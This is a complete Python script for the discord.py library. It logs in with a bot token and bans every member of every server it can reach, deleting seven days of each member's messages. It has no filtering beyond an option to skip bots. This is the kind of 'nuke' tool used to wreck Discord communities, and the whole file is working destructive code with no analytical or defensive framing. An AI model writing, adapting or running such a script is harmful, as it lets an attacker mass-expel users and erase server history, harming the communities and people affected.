import discord
intents = discord.Intents()
intents.members = True
intents.guilds = True
intents.presences = True
TOKEN = ""
SKIP_BOTS = False
fetch_offline_members = True
client = discord.Client(intents=intents)
@client.event
async def on_ready():
    print('Logged in!')
    for member in client.get_all_members():
        if member.bot and SKIP_BOTS:
            continue
        try:
            await member.ban(reason="xoxo", delete_message_days=7)
            print(f"Banned {member.display_name}!")
        except:
            print(f"Could not ban {member.display_name}")
    print("Banning is complete!")
client.run(TOKEN)
